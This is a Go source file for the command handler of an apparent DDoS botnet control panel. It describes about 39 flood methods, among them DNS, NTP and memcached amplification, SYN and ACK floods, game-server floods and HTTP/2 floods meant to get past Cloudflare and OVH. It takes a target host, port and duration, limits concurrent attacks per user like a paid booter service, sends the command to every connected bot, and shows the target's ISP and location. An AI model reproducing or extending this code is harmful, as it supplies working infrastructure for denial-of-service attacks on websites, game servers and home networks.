package commands

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	"agentv2/pkg/config"
	"agentv2/pkg/geoip"
	"agentv2/pkg/master"
)

// ANSI color constants
const (
	C0    = "\x1b[0m"           // reset
	CDim  = "\x1b[38;5;240m"    // separator / dim label
	CKey  = "\x1b[38;5;246m"    // field key
	CVal  = "\x1b[97m"          // value (white)
	CNum  = "\x1b[38;5;222m"    // numbers / port / time
	CCmd  = "\x1b[38;5;75m"     // command / method name
	CDesc = "\x1b[38;5;245m"    // description text
	CGood = "\x1b[38;5;114m"    // success / swarm count
	CWarn = "\x1b[38;5;215m"    // warning
	CErr  = "\x1b[38;5;203m"    // error
	CHead = "\x1b[1;97m"        // section header (bold white)
	CIP   = "\x1b[38;5;81m"     // IP address
	CUrl  = "\x1b[38;5;75m"     // url / host
)

type CommandHandler struct {
	cfgMgr       *config.ConfigManager
	botMgr       *master.BotManager
	activeLock   sync.Mutex
	userAttacks  map[string]int
	descriptions map[string]string
}

func NewCommandHandler(cfgMgr *config.ConfigManager, botMgr *master.BotManager) *CommandHandler {
	return &CommandHandler{
		cfgMgr:      cfgMgr,
		botMgr:      botMgr,
		userAttacks: make(map[string]int),
		descriptions: map[string]string{
			"dns":        "DNS flood, overwhelms name servers with forged queries",
			"udp":        "UDP flood, massive spoofed datagram traffic",
			"ldap":       "LDAP flood, overwhelms directory servers with bulk binds",
			"ssdp":       "SSDP flood, overloads devices with discovery requests",
			"ntp":        "NTP amplification flood, abuses monlist responses",
			"memcached":  "Memcached amplification, high-bandwidth UDP reflection",
			"home":       "Home DNS flood, targets home network DNS servers",
			"udpbypass":  "UDP Bypass, random-payload packets designed to bypass filters",
			"tcp":        "TCP flood, excessive SYN/connection requests",
			"socket":     "Socket flood, exhausts resources via open connections",
			"slowloris":  "Slowloris, keeps connections half-open to starve server threads",
			"ovh":        "OVH bypass, anti-DDoS protection bypass technique",
			"tcpmix":     "TCP Mix, combines multiple techniques to exhaust resources",
			"tcpbypass":  "TCP Bypass, packets designed to bypass stateful filtering",
			"ack":        "ACK flood, disrupts connections with spoofed TCP ACK packets",
			"game":       "Generic game flood, UDP packets disrupt gameplay",
			"rainbow":    "Rainbow Six flood, excessive UDP connection requests",
			"rocket":     "Rocket League flood, exhausts server via UDP connections",
			"roblox":     "Roblox flood, RakNet handshake packets overload servers",
			"fivem":      "FiveM flood, getinfo queries disrupt multiplayer sessions",
			"pubg":       "PUBG flood, crafted UDP packets bypass game filters",
			"fortnite":   "Fortnite flood, UDP packets cause lag and disconnects",
			"warthunder": "War Thunder flood, massive UDP session disruption",
			"counter":    "Counter-Strike flood, Source Engine query packets",
			"samp":       "SA-MP flood, server query packets overload game servers",
			"minecraft":  "Minecraft flood, legacy server ping packets",
			"subnet":     "Subnet flood, ICMP packets sprayed across an entire /24",
			"icmp":       "ICMP flood, echo requests saturate network bandwidth",
			"http":       "HTTP/1.1 GET flood, plain-text requests via keep-alive",
			"https":      "HTTPS/1.1 flood, TLS-encrypted GET requests",
			"httpx":      "HTTP-X flood, randomised headers + cache-busting params",
			"browser":    "Browser emulation flood, full Chrome-like header fingerprint",
			"http2":      "HTTP/2 flood, native multiplexed streams per TLS connection",
			"tls":        "HTTP/2 TLS flood, encrypted stream exhaustion via H2 HEADERS",
			"tlsx":       "HTTP/2 TLS-X, cache-busting + IP-spoofing headers over H2",
			"bypass":     "HTTP/2 bypass, X-Forwarded-For rotation over H2 streams",
			"cache":      "HTTP/2 cache buster, no-store/no-cache defeats CDN caching",
			"rapidflood": "HTTP/2 rapid flood, max concurrent streams per connection",
			"cloudflare": "HTTP/2 Cloudflare bypass, CF-Ray + CF-Connecting-IP spoofing",
		},
	}
}

func (h *CommandHandler) Handle(username string, rawCmd string) (response string, shouldClose bool, clearScreen bool) {
	parts := strings.Fields(strings.TrimSpace(rawCmd))
	if len(parts) == 0 {
		return "", false, false
	}

	cmdName := strings.ToLower(parts[0])

	switch cmdName {
	case "help":
		return h.helpMenu(), false, false
	case "methods":
		return h.methodsMenu(), false, false
	case "bots":
		count := h.botMgr.GetBotCount()
		return fmt.Sprintf("  %sbots%s  %s│%s  %s%d connected%s\r\n", CKey, C0, CDim, C0, CGood, count, C0), false, false
	case "clear", "cls":
		return "", false, true
	case "exit", "quit":
		return fmt.Sprintf("  %ssession closed%s\r\n", CDesc, C0), true, false
	default:
		cleanName := strings.TrimPrefix(cmdName, ".")
		method, ok := h.cfgMgr.FindMethod(cleanName)
		if !ok {
			// Try as exact
			method, ok = h.cfgMgr.FindMethod(cmdName)
		}

		if !ok {
			return fmt.Sprintf("  %serror%s  %s│%s  %sunknown command %s%s%s — type %shelp%s\r\n",
				CErr, C0, CDim, C0, CDesc, CCmd, cmdName, CDesc, CCmd, C0), false, false
		}

		return h.dispatchAttack(username, method, parts[1:]), false, false
	}
}

func (h *CommandHandler) helpMenu() string {
	var sb strings.Builder
	sb.WriteString("\r\n")
	sb.WriteString(fmt.Sprintf("  %sCOMMANDS%s\r\n", CHead, C0))
	sb.WriteString(fmt.Sprintf("  %s%s%s\r\n", CDim, strings.Repeat("─", 46), C0))
	sb.WriteString(fmt.Sprintf("  %s%-12s%s  %s│%s  %sShow this help message%s\r\n", CCmd, "help", C0, CDim, C0, CDesc, C0))
	sb.WriteString(fmt.Sprintf("  %s%-12s%s  %s│%s  %sList all available flood methods%s\r\n", CCmd, "methods", C0, CDim, C0, CDesc, C0))
	sb.WriteString(fmt.Sprintf("  %s%-12s%s  %s│%s  %sShow connected bot count%s\r\n", CCmd, "bots", C0, CDim, C0, CDesc, C0))
	sb.WriteString(fmt.Sprintf("  %s%-12s%s  %s│%s  %sClear the terminal screen%s\r\n", CCmd, "clear / cls", C0, CDim, C0, CDesc, C0))
	sb.WriteString(fmt.Sprintf("  %s%-12s%s  %s│%s  %sClose this session%s\r\n", CCmd, "exit / quit", C0, CDim, C0, CDesc, C0))
	sb.WriteString(fmt.Sprintf("  %s%s%s\r\n", CDim, strings.Repeat("─", 46), C0))
	sb.WriteString("\r\n")
	return sb.String()
}

func (h *CommandHandler) methodsMenu() string {
	methods := h.cfgMgr.GetMethods()
	if len(methods) == 0 {
		return fmt.Sprintf("  %serror%s  %s│%s  %sno methods configured in methods.json%s\r\n", CErr, C0, CDim, C0, CDesc, C0)
	}

	l4Udp := map[string]bool{"dns": true, "udp": true, "ldap": true, "ssdp": true, "ntp": true, "memcached": true, "home": true, "udpbypass": true}
	l4Tcp := map[string]bool{"tcp": true, "socket": true, "slowloris": true, "ovh": true, "tcpmix": true, "tcpbypass": true, "ack": true}
	l4Game := map[string]bool{"game": true, "rainbow": true, "rocket": true, "roblox": true, "fivem": true, "pubg": true, "fortnite": true, "warthunder": true, "counter": true, "samp": true, "minecraft": true}
	l3 := map[string]bool{"subnet": true, "icmp": true}
	l7h1 := map[string]bool{"http": true, "https": true, "httpx": true, "browser": true}
	l7h2 := map[string]bool{"http2": true, "tls": true, "tlsx": true, "bypass": true, "cache": true, "rapidflood": true, "cloudflare": true}

	var sb strings.Builder
	rule := fmt.Sprintf("%s%s%s", CDim, strings.Repeat("─", 52), C0)

	const (
		CL4U  = "\x1b[38;5;69m"
		CL4T  = "\x1b[38;5;75m"
		CL4G  = "\x1b[38;5;179m"
		CL3   = "\x1b[38;5;167m"
		CL7H1 = "\x1b[38;5;71m"
		CL7H2 = "\x1b[38;5;77m"
		CCust = "\x1b[38;5;243m"
	)

	sb.WriteString("\r\n")
	sb.WriteString(fmt.Sprintf("  %sMETHODS%s\r\n", CHead, C0))
	sb.WriteString(fmt.Sprintf("  %s\r\n", rule))

	appendCat := func(label, color string, filter map[string]bool) {
		var active []config.MethodConfig
		for _, m := range methods {
			if filter[strings.ToLower(m.Name)] {
				active = append(active, m)
			}
		}
		if len(active) == 0 {
			return
		}
		sb.WriteString("\r\n")
		sb.WriteString(fmt.Sprintf("  %s%s%s\r\n", color, label, C0))
		for _, m := range active {
			desc, ok := h.descriptions[strings.ToLower(m.Name)]
			if !ok {
				desc = "custom method"
			}
			sb.WriteString(fmt.Sprintf("    %s%-15s%s  %s│%s  %s%s%s\r\n", CCmd, "."+m.Name, C0, CDim, C0, CDesc, desc, C0))
		}
	}

	appendCat("L4 UDP   amplification & bypass", CL4U, l4Udp)
	appendCat("L4 TCP   flood & bypass", CL4T, l4Tcp)
	appendCat("L4 GAME  specialized udp / tcp", CL4G, l4Game)
	appendCat("L3       network protocols", CL3, l3)
	appendCat("L7 H1.1  tls + plain", CL7H1, l7h1)
	appendCat("L7 H2    native multiplexed", CL7H2, l7h2)

	// Custom
	var others []config.MethodConfig
	for _, m := range methods {
		n := strings.ToLower(m.Name)
		if !l4Udp[n] && !l4Tcp[n] && !l4Game[n] && !l3[n] && !l7h1[n] && !l7h2[n] {
			others = append(others, m)
		}
	}
	if len(others) > 0 {
		customMap := make(map[string]bool)
		for _, o := range others {
			customMap[strings.ToLower(o.Name)] = true
		}
		appendCat("CUSTOM", CCust, customMap)
	}

	sb.WriteString("\r\n")
	sb.WriteString(fmt.Sprintf("  %s\r\n", rule))
	sb.WriteString(fmt.Sprintf("  %s%-10s%s  %s.method %s<host> <port> <time>%s\r\n", CKey, "l4 usage", C0, CDesc, CVal, C0))
	sb.WriteString(fmt.Sprintf("  %s%-10s%s  %s.method %s<url> <time>%s\r\n", CKey, "l7 usage", C0, CDesc, CVal, C0))
	sb.WriteString(fmt.Sprintf("  %s%-10s%s  %s.bypass %shttps://example.com %s60%s\r\n", CKey, "example", C0, CCmd, CUrl, CNum, C0))
	sb.WriteString("\r\n")

	return sb.String()
}

func (h *CommandHandler) dispatchAttack(username string, method config.MethodConfig, args []string) string {
	hasPort := strings.Contains(method.Cmd, "{port}")
	targetHost := "N/A"
	targetPort := "N/A"
	attackDuration := "N/A"
	formattedCmd := method.Cmd

	if hasPort {
		if len(args) < 3 {
			return fmt.Sprintf("  %serror%s  %s│%s  %susage: %s.%s %s<host> <port> <time>%s\r\n",
				CErr, C0, CDim, C0, CDesc, CCmd, method.Name, CVal, C0)
		}
		targetHost = args[0]
		targetPort = args[1]
		attackDuration = args[2]
		formattedCmd = strings.ReplaceAll(formattedCmd, "{host}", targetHost)
		formattedCmd = strings.ReplaceAll(formattedCmd, "{port}", targetPort)
		formattedCmd = strings.ReplaceAll(formattedCmd, "{time}", attackDuration)
	} else {
		if len(args) < 2 {
			return fmt.Sprintf("  %serror%s  %s│%s  %susage: %s.%s %s<url> <time>%s\r\n",
				CErr, C0, CDim, C0, CDesc, CCmd, method.Name, CVal, C0)
		}
		targetHost = args[0]
		if len(args) >= 3 {
			attackDuration = args[2]
		} else {
			attackDuration = args[1]
		}
		formattedCmd = strings.ReplaceAll(formattedCmd, "{host}", targetHost)
		formattedCmd = strings.ReplaceAll(formattedCmd, "{time}", attackDuration)
	}

	userCfg, _ := h.cfgMgr.FindUser(username)
	concurrentLimit := userCfg.ConcurrentLimit
	if concurrentLimit <= 0 {
		concurrentLimit = 1
	}
	timeLimit := userCfg.TimeLimit
	if timeLimit <= 0 {
		timeLimit = 300
	}

	h.activeLock.Lock()
	curAttacks := h.userAttacks[username]
	if curAttacks >= concurrentLimit {
		h.activeLock.Unlock()
		return fmt.Sprintf("  %slimit%s  %s│%s  %sconcurrent attack limit reached %s(%d)%s\r\n",
			CErr, C0, CDim, C0, CDesc, CNum, concurrentLimit, C0)
	}

	warnMsg := ""
	parsedTime, err := strconv.Atoi(attackDuration)
	if err == nil && parsedTime > timeLimit {
		warnMsg = fmt.Sprintf("  %swarn%s   %s│%s  %stime clamped %s%ds %s→ %s%ds%s\r\n",
			CWarn, C0, CDim, C0, CDesc, CNum, parsedTime, CDim, CNum, timeLimit, C0)
		attackDuration = strconv.Itoa(timeLimit)
		// re-clamp command
		formattedCmd = method.Cmd
		if hasPort {
			formattedCmd = strings.ReplaceAll(formattedCmd, "{host}", targetHost)
			formattedCmd = strings.ReplaceAll(formattedCmd, "{port}", targetPort)
			formattedCmd = strings.ReplaceAll(formattedCmd, "{time}", attackDuration)
		} else {
			formattedCmd = strings.ReplaceAll(formattedCmd, "{host}", targetHost)
			formattedCmd = strings.ReplaceAll(formattedCmd, "{time}", attackDuration)
		}
	}

	h.userAttacks[username] = curAttacks + 1
	h.activeLock.Unlock()

	durSecs, _ := strconv.Atoi(attackDuration)
	if durSecs > 0 {
		go func(u string, waitSec int) {
			time.Sleep(time.Duration(waitSec+2) * time.Second)
			h.activeLock.Lock()
			if h.userAttacks[u] > 0 {
				h.userAttacks[u]--
			}
			h.activeLock.Unlock()
		}(username, durSecs)
	}

	dispatched := h.botMgr.BroadcastCommand(formattedCmd)
	geo := geoip.Resolve(targetHost)

	var sb strings.Builder
	if warnMsg != "" {
		sb.WriteString(warnMsg)
	}

	rule := fmt.Sprintf("%s%s%s", CDim, strings.Repeat("─", 48), C0)
	sb.WriteString("\r\n")
	sb.WriteString(fmt.Sprintf("  %s\r\n", rule))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s%s\r\n", CKey, "target", C0, CVal, targetHost, C0))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s%s\r\n", CKey, "ip", C0, CIP, geo.ResolvedIP, C0))
	if targetPort != "N/A" {
		sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s%s\r\n", CKey, "port", C0, CNum, targetPort, C0))
	}
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%ss%s\r\n", CKey, "duration", C0, CNum, attackDuration, C0))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s.%s%s\r\n", CKey, "method", C0, CCmd, strings.ToUpper(method.Name), C0))
	sb.WriteString(fmt.Sprintf("  %s\r\n", rule))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s%s\r\n", CKey, "isp", C0, CDesc, geo.ISP, C0))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s, %s%s\r\n", CKey, "region", C0, CDesc, geo.Region, geo.Country, C0))
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%s%s\r\n", CKey, "asn", C0, CDesc, geo.ASN, C0))
	sb.WriteString(fmt.Sprintf("  %s\r\n", rule))
	botPlural := "bots"
	if dispatched == 1 {
		botPlural = "bot"
	}
	sb.WriteString(fmt.Sprintf("  %s%-9s%s  %s%d %s dispatched%s\r\n", CKey, "swarm", C0, CGood, dispatched, botPlural, C0))
	sb.WriteString("\r\n")

	return sb.String()
}
